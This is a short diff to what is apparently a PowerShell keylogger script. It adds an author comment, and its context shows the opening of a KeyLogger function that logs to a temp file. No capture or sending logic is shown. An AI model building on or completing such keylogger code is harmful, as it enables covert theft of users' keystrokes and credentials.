@@ -1,3 +1,4 @@
+#MADE BY SYKE
 
 # keylogger
 function KeyLogger($logFile="$env:temp/keylogger.log") {
